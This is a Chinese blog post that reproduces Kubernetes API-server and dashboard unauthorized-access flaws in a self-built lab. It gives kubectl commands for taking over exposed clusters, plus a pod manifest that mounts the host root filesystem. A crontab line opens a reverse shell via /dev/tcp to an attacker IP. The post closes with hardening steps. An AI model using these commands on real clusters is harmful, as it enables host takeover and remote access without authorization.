+++
title= "K8s Remote Api未授权利用"
slug= "kubernetes-remote-api-unauthorized"
description= "集群搭建让我红温🥵"
date= "2025-10-01T10:01:15+08:00"
lastmod= "2025-10-01T10:01:15+08:00"
image= ""
license= ""
categories= ["talk"]
tags= ["k8s"]

+++

## 环境搭建

6443、8080、10250端口未授权利用漏洞

搭建k8s集群🥵，这里卡了很久。我是真的红温了🤬（byd用引用的文章里面写的根本不行）

**k8s1.16.0以下版本默认启用8080端口（无认证）。**我们只需要用一个不弃用8080端口的再修改配置就可以了

```bash
./metarget gadget install k8s --version 1.16.5
```

方便等会复现漏洞，我们起一个nginx

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginx-pod
spec:
  containers:
  - name: nginx-container
    image: nginx:1.16.1
    ports:
    - containerPort: 80
kubectl apply -f nginx-pod.yaml
kubectl get pods


# 测试一下8080是否是未授权
curl http://localhost:8080/api/v1/namespaces/default/pods
```

修改8080端口服务

```bash
sudo vim /etc/kubernetes/manifests/kube-apiserver.yaml

- --insecure-port=8080
- --insecure-bind-address=0.0.0.0

sudo systemctl restart kubelet
```

配置dashboard

```bash
kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yaml

# 修改 Dashboard 允许 HTTP 访问
kubectl patch deployment kubernetes-dashboard -n kube-system --type='json' -p='[{"op": "add", "path": "/spec/template/spec/containers/0/args/-", "value": "--enable-insecure-login"}]'
kubectl patch deployment kubernetes-dashboard -n kube-system --type='json' -p='[{"op": "add", "path": "/spec/template/spec/containers/0/args/-", "value": "--enable-skip-login"}]'
```

创建管理员用户

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-user
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1beta1
kind: ClusterRoleBinding
metadata:
  name: admin-user
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: admin-user
  namespace: kube-system
```

应用并且尝试获取管理员token

```bash
kubectl apply -f dashboard-admin.yaml

kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk '{print $1}') | grep token:
kubectl port-forward -n kube-system service/kubernetes-dashboard 9090:80 --address 0.0.0.0
```

## 漏洞复现

### 8080端口未授权

#### 已有pod可控

```bash
kubectl -s ip:8080 get nodes
kubectl -s ip:8080 get pods
```

正常获取到刚才创建的nginxPod，执行命令进入

```bash
kubectl -s ip:8080 exec -it nginx-pod -n default bash
```

#### 新建pod逃逸至宿主机

将宿主机根目录挂载到`/mnt`

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: koube
spec:
  containers:
  - image: nginx
    name: test-container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```

应用配置

```bash
kubectl -s ip:8080 create -f test.yaml
kubectl -s ip:8080 -n default exec -it test /bin/bash

echo -e "* * * * * root bash -i >& /dev/tcp/ip/4444 0>&1\n" >> /mnt/etc/crontab
```

过一分钟收到反弹shell

### 6443端口未授权

一样的新建pod进行逃逸

```bash
kubectl --insecure-skip-tls-verify -s ip:6443 get nodes
kubectl --insecure-skip-tls-verify -s ip:6443 get pods

kubectl --insecure-skip-tls-verify -s ip:6443 apply -f test.yaml
kubectl --insecure-skip-tls-verify -s ip:6443 exec -it test -n default /bin/bash
```

### kubernetes dashboard

最重要的就是能够登陆，只要能登陆就能创造pod

```bash
kubectl  get sa,secrets -n kubernetes-dashboard
kubectl  describe secrets admin-user-token-tq2kj -n kubernetes-dashboard
```

然后一样的挂载反弹shell

## 漏洞修复

直接禁止外部访问

```bash
sudo vim /etc/kubernetes/manifests/kube-apiserver.yaml

# 禁用不安全端口 --insecure-port=0
# 禁止外部访问，删除 --insecure-bind-address=0.0.0.0
# 确保有以下安全配置：
# 禁用匿名访问 --anonymous-auth=false
# 启用RBAC授权 --authorization-mode=Node,RBAC  
# 启用节点限制 --enable-admission-plugins=NodeRestriction

# 修复dashboard
# 移除--enable-insecure-login
kubectl -n kube-system patch deployment kubernetes-dashboard --type='json' -p='[{"op": "remove", "path": "/spec/template/spec/containers/0/args/2"}]'
# 移除--enable-skip-login
kubectl -n kube-system patch deployment kubernetes-dashboard --type='json' -p='[{"op": "remove", "path": "/spec/template/spec/containers/0/args/2"}]' 


sudo systemctl restart kubelet
```

> https://developer.aliyun.com/article/1626337
>
> https://www.jianshu.com/p/e443b3171253
>
> https://www.freebuf.com/articles/container/382450.html
